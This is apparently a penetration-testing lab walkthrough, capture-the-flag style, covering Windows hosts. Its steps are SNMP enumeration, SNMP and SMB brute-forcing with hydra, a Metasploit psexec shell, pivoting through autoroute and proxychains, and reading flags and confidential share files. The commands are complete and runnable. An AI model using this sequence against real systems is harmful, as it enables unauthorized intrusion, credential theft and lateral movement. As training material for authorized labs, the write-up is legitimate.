---
title: 'SNMP ()'
description: ''
pubDate: 'Jul 03 2022'
heroImage: '/'
tag: ['windows', 'smb']
---

Port 161 SNMP

```bash
# recolectar informacion
snmpwalk -v 2c -c public target_id

# Permite especificar un identificador de objeto or oid
# se utiliza para encontrar los programas disponibles en la máquina
snmpwalk -v 2c -c public target_ip hrSWInstalledName

snmpwalk -v 2c -c public target_ip hrMemorySize

# list
snmpwalk -v 2c -c public target_ip sysContact

# modify
snmpset -v 2c -c public target_id sysContact.0 s els

# nmap

nmap --script=snmp-win32-services


```

We must keep in mind that nmap does not check for UDP ports by default. As we already know, SNMP runs on the UDP port 161.

Therefore, let's check if this specific is opened.

```bash
nmap -sU -p 161 target_ip
```

As we can see, the UDP port 161 is open. This information is crucial for our following tasks.

Note: We will have to double-check nmap results by sending SNMP requests to the host and checking if we get responses from both. Sometimes, when host-based firewalls protect the hosts, they may confuse the nmap scan results.

### Now, we need to find the SNMP server community string to access the target machine service.

Note: If you are not familiar with SNMP terms like communities, please, take a look at the course material.

We could use nmap snmp-brute script to find the community string. The script uses the snmpcommunities.lst list for brute-forcing it is located inside /usr/share/nmap/nselib/data/snmpcommunities.lst directory.


```bash

nmap -sU -p 161 --script=snmp-brute target_ip_local

# As we can see, we found three community names:
#public,
#private,
#and
#secret

# snmpwalk tool to find all the information via SNMP.
```

***snmpwalk*** is an SNMP application that uses SNMP GETNEXT requests to query a network entity for a tree of information.

An object identifier (OID) may be given on the command line. This OID specifies which portion of the object identifier space will be searched using GETNEXT requests.

All variables in the subtree below the given OID are queried and their values presented to the user. Each variable name is given in the format specified in variables.

If no OID argument is present, snmpwalk will search the subtree rooted at SNMPv2-SMI::mib-2 (including any MIB object values from other MIB modules, that are defined as lying within this subtree). 

If the network entity has an error processing the request packet, an error packet will be returned and a message will be shown, helping to pinpoint why the request was malformed.

If the tree search causes attempts to search beyond the end of the MIB, the message "End of MIB" will be displayed. Source **https://linux.die.net/man/1/snmpwalk**

We are running the snmpwalk command on the target machine.

```bash
snmpwalk -v 1 -c public target_ip_local
-v
#: Specifies SNMP version to use

-c
#: Set the community string
```

We were able to gather a lot of information via SNMP. But, this isn't in a proper readable format. We need to take the help of other tools, i.e., nmap SNMP scripts, for specific information.

### Let's run all the SNMP nmap scripts to gather all possible information via the SNMP service.


```bash
nmap -sU -p 161 --script snmp-\* target_ip_local > snmp_output

snmp_output
file.

```

This nmap script scan would take some time. Please wait patiently.

From the list of information retrieved, we found a couple of engaging data, such as running processes, users, services, installed applications, etc.

However, analyzing the results, one absorbing information we could extract is the list of Windows users:

### Now, let's run a brute-force attack using these windows users on SMB service.

Remember, port 445 is open, and we can run a brute-force attack using the hydra tool.

First, let's save two usernames in a file. i.e administrator and admin

```bash
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target_ip_local smb

#The hydra switches are described in the help: hydra -help. However, the most relevant parts of the command are explained below:

-L users.txt

# This is the dictionary file containing a list of users.

-P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

***SMB***

This is the protocol that should be used by hydra to perform the brute-force attack.
After a couple of minutes, we should see the following results:
Thus, hydra successfully found a valid password for administrator and admin users.

### Now, we will run the psexec Metasploit exploit module to gain the meterpreter session using these credentials.

Let's try to get a shell on this system using the PSExec module of the Metasploit framework.


```bash
msfconsole -q
use exploit/windows/smb/psexec
show options
```

As we can see, we have to set RHOSTS SMBUSER and SMBPASS.
Rest all other essential values, i.e. PAYLOAD, and LHOST, is already set.

Let's set all these values and exploit the target.

```bash
set RHOSTS target_ip_local
set SMBUSER administrator
set SMBPASS elizabeth
exploit

```

Note: If you don't gain a meterpreter session for some reason, please re-exploit the target.

We have successfully gained the meterpreter session on the target machine.

### Now, let's read the flag.

```powershell
shell
cd C:\
dir
type FLAG1.txt

# FLAG: a8f5f167f44f4964e6c998dee827110c
```

We have found the flag!

#####################

```bash
ping target_ip_local
ping target_ip
```

Only one provided machine is reachable, i.e., target_ip_local, and we also found the target's IP addresses.

### Check open ports on the target_ip_local machine.

```bash
nmap target_ip_local
```

Multiple ports are open on the target_ip_local machine.

All the ports expose core services of the Windows operating system, i.e., SMB, RDP, RPC, etc.

There are multiple versions of the SMB protocol.

- SMB1
- SMB 2.0
- SMB 2.1
- SMB 3.0
- SMB 3.0.2
- SMB 3.1.1

***SMBv1:***

Server Message Block (SMB) is an application layer network protocol commonly used in Microsoft Windows to provide shared access to files and printers. SMBv1 is the original protocol developed in the 1980s, making it more than 30 years old. More secure and efficient versions of SMB are available today. 

The SMBv1 protocol is not safe to use. By using this old protocol, you lose protections such as pre-authentication integrity, secure dialect negotiation, encryption, disabling insecure guest logins, and improved message signing. 

Microsoft has advised customers to stop using SMBv1 because it is extremely vulnerable and full of known exploits. WannaCry, a well-known ransomware attack, exploited vulnerabilities in the SMBv1 protocol to infect other systems. Because of the security risks, support for SMBv1 has been disabled. Source: **https://kb.iu.edu/d/aumn**

SMBv1 is used in the old Windows operating system. However, it is still present in the latest Windows OS too. We can disable/enable all SMB versions by modifying the windows registries.

SMBv1 onwards, all the versions are reasonability secure. They provide many security protections, i.e., disabling insecure guest logins, pre-authentication integrity, secure dialect negotiation, encryption, etc.

While scanning using nmap, we discovered the SMB service port 445.

To learn more about all protocol versions and changes. Please refer to the following link: **https://en.wikipedia.org/wiki/Server_Message_Block**

Now, let's perform enumeration and exploitation of the SMB protocol.

### Let's run nmap on port 445 to get more information about the protocol.

```bash
nmap -sV -p 139,445 target_ip_local
-sV
#: Probe open ports to determine service/version info

-p 139,445
#: Only scan specified ports
```

We have received information about both the ports. Also, identified that the target is
Microsoft Windows Server 2008 R2 - 2012

### Now, let's identify all the supported SMB versions on the target machine.

We can quickly identify it using the nmap script
smb-protocols.

```bash
nmap -p445 --script smb-protocols target_ip_local
-p445
#: Only scan specified port.

--script smb-protocols
#: Script Scan
```
We can notice that all three versions are accessible.

There is one more interesting nmap script for the smb protocol to find the security level of the protocol.

### Let's run the nmap script to find the smb protocol security level.

```bash
nmap -p445 --script smb-security-mode target_ip_local
```

We have tried to access the target SMB server using a guest user. We have received SMB security level information.

We can find more information from the following link: **https://nmap.org/nsedoc/scripts/smb-security-mode.html**

This clarifies that the nmap script uses the guest user for all the smb script scan. We can define another user also. But, we need valid credentials to access the target machine.

The guest user is the default user available on all the windows operating systems.

If an attacker has valid credentials on the target machine. Then, command execution is possible. It depends on the user privilege.

Now, let's find that we have the Null Session, i.e Anonymous access on the target machine using the smbclient tool.

smbclient is a client that can 'talk' to an SMB/CIFS server. It offers an interface similar to that of the ftp program. Operations include things like getting files from the server to the local machine, putting files from the local machine to the server, retrieving directory information from the server and so on. Step 7: Let's run the smbclient tool to find that we have anonymous access on the target machine.

```bash
smbclient -L target_ip_local
Enter WORKGROUP\root's password: <enter>
```

We can access the target using anonymous login.

### Now, we have anonymous access to the target machine. We can smoothly dump all the present windows users using the nmap script.

Let's find all the present users using nmap smb-enum-users script.

```bash
nmap -p445 --script smb-enum-users.nse target_ip_local
```

There are a total of four users present. admin, administrator, root, and guest

The guest and administrator users are built-in accounts.

Now, let's find the valid password for admin,administrator, and root user.

### First, let's create a file (users.txt) and keep all these users

Now, let's run the hydra tool for brute-forcing the SMB protocol to find the valid password of the provided users.

```bash
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target_ip_local smb
-L
#: List of users

-P
#: Password list

target_ip_local smb
#: Target Address and Target Protocol

```

We have successfully retrieved valid passwords for all three users.

### Now, we can use the Metasploit framework and run the

psexec exploit module to gain the meterpreter shell using the administrator user valid password.

Microsoft Windows Authenticated User Code Execution

Let's start the Metasploit framework and exploit it!

```bash
# Note: If the exploit won't give you a meterpreter session. Try again!

msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS target_ip_local
set SMBUser administrator
set SMBPass password1
exploit
```

Success!. We have received a meterpreter session.

### Now, we will discover target machine information, e.g., current user, system information, arch, etc.

```bash
getuid
sysinfo
```

We notice that target is running a windows server, and we have received a meterpreter session with "SYSTEM" (or "NT Authority") privileges on the machine.

### Let's read the flag.

```bash
cat C:\\Users\\Administrator\\Documents\\FLAG1.txt
#We have found the FLAG1:
8de67f44f49264e6c99e8a8f5f17110c
```

### Let's check if we can access target_ip from the compromised host.

Before, ping to the second target machine from the compromised host. We need to know the IP address for the target_ip host.

Remember, when we did ping to both the targets and discovered IP addresses of these target machines:

1. target_ip.local: 10.0.17.62

2. target_ip : 10.0.22.69

Now, let's ping to the 10.0.22.69 and verify that it is reachable from the second machine.

```powershell
shell
ping 10.0.22.69

#We can access the target_ip machine, i.e., 10.0.22.69.
```

However, we cannot access that machine (10.0.22.69) from the Kali machine. So, here we need to perform pivoting by adding route from the Metasploit framework.

### Let's add the route using the meterpreter session and identify the second machine service.

```powershell
CTRL + C
y
run autoroute -s 10.0.22.69/20
```

We have successfully added the route to access the target_ip machine.

### Now, let's start the socks proxy server to access the pivot system on the attacker's machine using the proxychains tool.

First start the socks4a server using the Metasploit module.

Socks4a Proxy Server

This module provides a socks4a proxy server with built-in Metasploit routing to relay connections. Source:: **https://www.rapid7.com/db/modules/auxiliary/server/socks4a/**

Note: The proxychains should have configured with the following parameters (at the end of /etc/proxychains4.conf):

```powershell
cat /etc/proxychains4.conf

```

We can notice, socks4 port is 9050.

Now, let's run the Metasploit socks proxy auxiliary server module on port 9050.

```powershell
background
use auxiliary/server/socks_proxy
show options

```

We notice that SRVPORT is
1080, and VERSION is 5 mentioned in the module options. But, we need to set the port to 9050 and the version to 4a.

Let's change both the values then run the server.

```powershell
set SRVPORT 9050
set VERSION 4a
exploit
jobs

```

We can notice that the server is running perfectly.

### Now, let's run nmap with proxychains to identify SMB port (445) on the pivot machine, i.e. target_ip

We could also specify multiple ports. But, in this case, we are only interested in SMB service.

```powershell
proxychains nmap target_ip -sT -Pn -sV -p 445
target_ip
#: The pivot machine
-sT
#: TCP connect scan

-Pn
#: Skip host discovery and force port scan.

-sV
#: Probe open ports to determine service/version info

-p 445
#: Define port to scan
```
This scan is the safest way to identify the open ports. We could use an auxiliary TCP port scanning module. But those are very aggressive and can kill your session.

We notice that port 445 is open on the target machine.

### Now, let's use the net view command to find all resources shared by the target_ip machine.

Interact with the meterpreter session again.

```powershell
sessions -i 1
shell
net view 10.0.22.69
```

We have received the Access is denied. message.

Well, currently, we are running as NT AUTHORITY\SYSTEM privilege. Let's migrate the process into explorer.exe and reaccess it.

```powershell
migrate -N explorer.exe
shell
net view 10.0.22.69
```

This time we can see two shared resources. Documents and K drive. And, this confirms that pivot target (target_ip) allows Null Sessions, so we can access the shared resources. Also, we can achieve the same goal in several ways.

### Now, we can map the shared drive to the target_ip machine using the 'net' command.

Let's map the shared resources, i.e., the Documents and K drive.

```powershell
net use D: \\10.0.22.69\Documents
net use K: \\10.0.22.69\K$
```

We successfully mapped the resources to D and K drives.

### Let's check what is inside these mapped drives.

```powershell
dir D:
dir K:
```

Now that we can browse the shares content, we can download or read it on the attacker's machine.

Let's read the
FLAG2
and
Confidential.txt
files.
